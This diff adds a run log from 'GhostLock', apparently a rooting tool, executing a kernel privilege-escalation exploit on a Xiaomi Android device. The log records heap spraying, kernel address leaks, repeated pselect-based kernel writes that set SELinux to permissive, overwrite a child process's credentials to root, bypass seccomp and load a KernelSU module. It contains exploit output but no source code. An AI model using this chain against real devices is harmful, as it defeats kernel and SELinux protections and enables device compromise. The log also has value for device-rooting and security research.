@@ -1,0 +1,176 @@
+# GhostLock crash log
+# started=2026-10-28 14:15:57
+# device=Xiaomi 25042PN24C
+# build=BP2A.250605.031.A3
+# fingerprint=Xiaomi/dijun/dijun:16/BP2A.250605.031.A3/OS3.0.302.0.WODCNXM:user/release-keys
+# kernel=6.6.77-android15-8-g5770c661275f-abogki443185593-4k
+# sdk=36
+# path=/storage/emulated/0/Download/ghostlock-20261028-141557.log
+[*] log file: /storage/emulated/0/Download/ghostlock-20261028-141557.log
+[*] start
+[+] GhostLock native ready (116208 bytes)
+[*] selected root implementation: KernelSU
+[*] using bundled XRING ksud: libksud_kernelsu.so (6388984 bytes)
+[+] KernelSU ksud ready
+[*] Xiaomi XRING O1 detected; using CPU 2
+[*] runtime home=/data/user/0/com.ayyy.glxring/files script=/data/user/0/com.ayyy.glxring/files/.ghostlock_root.sh
+[+] boot_id saved value=7b9af85e-6854-4bb5-9020-ba962098c393
+[*] kernel: 6.6.77-android15-8-g5770c661275f-abogki443185593-4k
+[+] offsets matched: 6.6.77-android15-8-g5770c661275f-abogki443185593-4k
+[*] init_cred image=ffffffc0820f0548 alias=ffffff80022f0548
+[+] startup context pid=29646 uid=10408 euid=10408 gid=10408 egid=10408 attr=u:r:untrusted_app:s0:c152,c257,c512,c768 enforce=unreadable
+[+] startup limits pid=29646 NoNewPrivs=0 Seccomp=2 Seccomp_filters=1
+[+] build config pid=29646 label=ghostlock_oplus slide=pselect main=pselect
+[+] p0 profile pid=29646 phys_offset=0000000000000000 kernel_phys_load=0000000000200000 delta=0000000000200000 slide_logger=ffffff80022d2270 bootid_data=ffffff8002536f58 init_task=ffffff80022de280 root_tg=ffffff80024d4580 sysctl_bootid=ffffff8002536f58
+[*] p0 kernel_phys_load=0000000000200000 delta=0000000000200000
+[*] [T+0ms] exploit start
+[-] SELinux enforce unreadable; assuming enforcing and running W1
+[*] [T+0ms] pre-W1 drain
+[*] W1: SELinux attempt 1/8
+[*] === W1: SELinux === target=0xffffff8002515f68 mode=1 leaf=0
+[*] [T+156ms]   heap spray start
+[*] [spray] mm spray + kernelsnitch ready (cpu=10) +145ms
+[*] [spray] finding futex collisions... +356ms
+[*] [spray] futex collisions found +1000ms
+[*] [spray] mm_struct leaked=0xffffff833c1a0a00 +1084ms
+[*] [spray] payload ready +1087ms
+[*] prepare_kernel_page ok attempt=1 +1191ms
+[*] [T+1347ms]   heap spray done
+[*] pselect route setup attempt=1 simple=0 shift=-2 page=ffffff833c1a0000 fake_lock=ffffff833c1a0000 fake_w0=ffffff833c1a0300 fake_task=ffffff833c1a0400 in0=0000000000000000 in3=0000000000000001 out0=0000000000000000 ex0=ffffff833c1a0400 ex1=ffffff833c1a0000 ex2=0000000000000003 ex3=0000000000000000
+[*] pselect pre-select +0ms
+[*] pselect post-select +203ms ret=4
+[*] pselect returned attempt=1 ret=4 errno=0 calls=1 success=1 delay=50000
+[*] pselect route probing cfi attempt=1 ret=4 expected=9
+[*] pselect route done calls=1 success=1 step=0 errno=0
+[*] [T+3559ms]   PI route done
+[*] W1: SELinux attempt 2/8
+[*] === W1: SELinux === target=0xffffff8002515f68 mode=1 leaf=0
+[*] [T+3711ms]   heap spray start
+[*] [spray] mm spray + kernelsnitch ready (cpu=10) +181ms
+[*] [spray] finding futex collisions... +442ms
+[*] [spray] futex collisions found +852ms
+[*] [spray] mm_struct leaked=0xffffff817c813c00 +912ms
+[*] [spray] payload ready +913ms
+[*] prepare_kernel_page ok attempt=1 +1020ms
+[*] [T+4732ms]   heap spray done
+[*] pselect route setup attempt=1 simple=0 shift=-2 page=ffffff817c810000 fake_lock=ffffff817c810000 fake_w0=ffffff817c810300 fake_task=ffffff817c810400 in0=0000000000000000 in3=0000000000000001 out0=0000000000000000 ex0=ffffff817c810400 ex1=ffffff817c810000 ex2=0000000000000003 ex3=0000000000000000
+[*] pselect pre-select +0ms
+[*] pselect post-select +201ms ret=4
+[*] pselect returned attempt=1 ret=4 errno=0 calls=1 success=1 delay=50000
+[*] pselect route probing cfi attempt=1 ret=4 expected=9
+[*] pselect route done calls=1 success=1 step=0 errno=0
+[*] [T+6941ms]   PI route done
+[*] W1: SELinux attempt 3/8
+[*] === W1: SELinux === target=0xffffff8002515f68 mode=1 leaf=0
+[*] [T+7093ms]   heap spray start
+[*] [spray] mm spray + kernelsnitch ready (cpu=10) +184ms
+[*] [spray] finding futex collisions... +419ms
+[*] [spray] futex collisions found +733ms
+[*] [spray] mm_struct leaked=0xffffff8086258500 +791ms
+[*] [spray] payload ready +791ms
+[*] prepare_kernel_page ok attempt=1 +904ms
+[*] [T+7997ms]   heap spray done
+[*] pselect route setup attempt=1 simple=0 shift=-2 page=ffffff8086258000 fake_lock=ffffff8086258000 fake_w0=ffffff8086258300 fake_task=ffffff8086258400 in0=0000000000000000 in3=0000000000000001 out0=0000000000000000 ex0=ffffff8086258400 ex1=ffffff8086258000 ex2=0000000000000003 ex3=0000000000000000
+[*] pselect pre-select +0ms
+[*] pselect post-select +202ms ret=8
+[*] pselect returned attempt=1 ret=8 errno=0 calls=1 success=1 delay=50000
+[*] pselect route probing cfi attempt=1 ret=8 expected=9
+[*] pselect route done calls=1 success=1 step=0 errno=0
+[*] [T+10205ms]   PI route done
+[+] SELinux permissive
+[*] [T+10307ms] Write 1 complete
+[*] [T+10525ms] pre-W2 drain
+[*] perf task: 0xffffff8345218000 (67/256 votes)
+[*] [T+10673ms] perf_find_task done
+[*] child_pid=2498 child_task=0xffffff8345218000
+[*] W2: cred attempt 1/10
+[*] === W2: cred === target=0xffffff8345218820 mode=2 leaf=0
+[*] [T+10882ms]   heap spray start
+[*] [spray] mm spray + kernelsnitch ready (cpu=10) +172ms
+[*] [spray] finding futex collisions... +419ms
+[*] [spray] futex collisions found +775ms
+[*] [spray] mm_struct leaked=0xffffff802ae7b200 +807ms
+[*] [spray] payload ready +808ms
+[*] prepare_kernel_page ok attempt=1 +929ms
+[*] [T+11811ms]   heap spray done
+[*] pselect route setup attempt=1 simple=0 shift=-2 page=ffffff802ae78000 fake_lock=ffffff802ae78000 fake_w0=ffffff802ae78300 fake_task=ffffff802ae78400 in0=0000000000000000 in3=0000000000000001 out0=0000000000000000 ex0=ffffff802ae78400 ex1=ffffff802ae78000 ex2=0000000000000003 ex3=0000000000000000
+[*] pselect pre-select +0ms
+[*] pselect post-select +203ms ret=8
+[*] pselect returned attempt=1 ret=8 errno=0 calls=1 success=1 delay=50000
+[*] pselect route probing cfi attempt=1 ret=8 expected=9
+[*] pselect route done calls=1 success=1 step=0 errno=0
+[*] [T+14022ms]   PI route done
+[*] child uid = 0
+[+] child is root!
+[*] W3-0: leaf dir attempt 1/4
+[*] === W3-0: leaf dir === target=0xffffff8345218830 mode=1 leaf=1
+[*] [T+14307ms]   heap spray start
+[*] [spray] mm spray + kernelsnitch ready (cpu=10) +175ms
+[*] [spray] finding futex collisions... +410ms
+[*] [spray] futex collisions found +619ms
+[*] [spray] mm_struct leaked=0xffffff81990a0500 +656ms
+[*] [spray] payload ready +657ms
+[*] prepare_kernel_page ok attempt=1 +789ms
+[*] [T+15096ms]   heap spray done
+[*] pselect route setup attempt=1 simple=0 shift=-2 page=ffffff81990a0000 fake_lock=ffffff81990a0000 fake_w0=ffffff81990a0300 fake_task=ffffff81990a0400 in0=0000000000000000 in3=0000000000000001 out0=0000000000000000 ex0=ffffff81990a0400 ex1=ffffff81990a0000 ex2=0000000000000003 ex3=0000000000000000
+[*] pselect pre-select +0ms
+[*] pselect post-select +201ms ret=8
+[*] pselect returned attempt=1 ret=8 errno=0 calls=1 success=1 delay=50000
+[*] pselect route probing cfi attempt=1 ret=8 expected=9
+[*] pselect route done calls=1 success=1 step=0 errno=0
+[*] [T+17304ms]   PI route done
+[*] leaf dir probe comm_len=0 comm[0]=00
+[*] leaf=1 write lands on [target]
+[*] W3a: TIF_SECCOMP attempt 1/6
+[*] === W3a: TIF_SECCOMP === target=0xffffff8345218000 mode=1 leaf=1
+[*] [T+17578ms]   heap spray start
+[*] [spray] mm spray + kernelsnitch ready (cpu=10) +183ms
+[*] [spray] finding futex collisions... +440ms
+[*] [spray] futex collisions found +1004ms
+[*] [spray] mm_struct leaked=0xffffff8074b42d00 +1070ms
+[*] [spray] payload ready +1071ms
+[*] prepare_kernel_page ok attempt=1 +1207ms
+[*] [T+18785ms]   heap spray done
+[*] pselect route setup attempt=1 simple=0 shift=-2 page=ffffff8074b40000 fake_lock=ffffff8074b40000 fake_w0=ffffff8074b40300 fake_task=ffffff8074b40400 in0=0000000000000000 in3=0000000000000001 out0=0000000000000000 ex0=ffffff8074b40400 ex1=ffffff8074b40000 ex2=0000000000000003 ex3=0000000000000000
+[*] pselect pre-select +0ms
+[*] pselect post-select +204ms ret=8
+[*] pselect returned attempt=1 ret=8 errno=0 calls=1 success=1 delay=50000
+[*] pselect route probing cfi attempt=1 ret=8 expected=9
+[*] pselect route done calls=1 success=1 step=0 errno=0
+[*] [T+20995ms]   PI route done
+[*] W3a direct finit_module probe = 0x16
+[+] W3a direct probe: filter bypassed in child (errno=22)
+[+] W3a: child TIF_SECCOMP cleared
+[*] seccomp finit_module probe = 0xfffffffd
+[*] W3b: seccomp mode attempt 1/4
+[*] === W3b: seccomp mode === target=0xffffff83452188e8 mode=1 leaf=1
+[*] [T+21274ms]   heap spray start
+[*] [spray] mm spray + kernelsnitch ready (cpu=10) +186ms
+[*] [spray] finding futex collisions... +448ms
+[*] [spray] futex collisions found +1215ms
+[*] [spray] mm_struct leaked=0xffffff815d31df00 +1258ms
+[*] [spray] payload ready +1260ms
+[*] prepare_kernel_page ok attempt=1 +1399ms
+[*] [T+22672ms]   heap spray done
+[*] pselect route setup attempt=1 simple=0 shift=-2 page=ffffff815d318000 fake_lock=ffffff815d318000 fake_w0=ffffff815d318300 fake_task=ffffff815d318400 in0=0000000000000000 in3=0000000000000001 out0=0000000000000000 ex0=ffffff815d318400 ex1=ffffff815d318000 ex2=0000000000000003 ex3=0000000000000000
+[*] pselect pre-select +0ms
+[*] pselect post-select +203ms ret=8
+[*] pselect returned attempt=1 ret=8 errno=0 calls=1 success=1 delay=50000
+[*] pselect route probing cfi attempt=1 ret=8 expected=9
+[*] pselect route done calls=1 success=1 step=0 errno=0
+[*] [T+24883ms]   PI route done
+[*] seccomp finit_module probe = 0x16
+[+] child seccomp filter bypassed (finit_module errno=22)
+[+] child seccomp fully bypassed (forked workers run filter-free)
+[*] [T+26936ms] exploit complete
+[+] boot_id restore saved=7b9af85e-6854-4bb5-9020-ba962098c393 current=7b9af85e-6854-4bb5-9020-ba962098c393 label=u:object_r:proc_random:s0 ok=1
+[+] KernelSU module loaded
+[+] KernelSU ready; SELinux enforcing restored
+[*] root script start uid=0 euid=0
+[*] seccomp=Seccomp:	0 Seccomp_filters:	0 
+[*] ksud=/data/user/0/com.ayyy.glxring/files/ksud
+[*] ksud_file=-rwx------ 1 u0_a408 u0_a408 6388984 2026-10-28 14:16 /data/user/0/com.ayyy.glxring/files/ksud
+[*] uname=6.6.77-android15-8-g5770c661275f-abogki443185593-4k
+[*] late-load kmi=android15-6.6
+[*] late-load exit=0
+[+] exit code=0
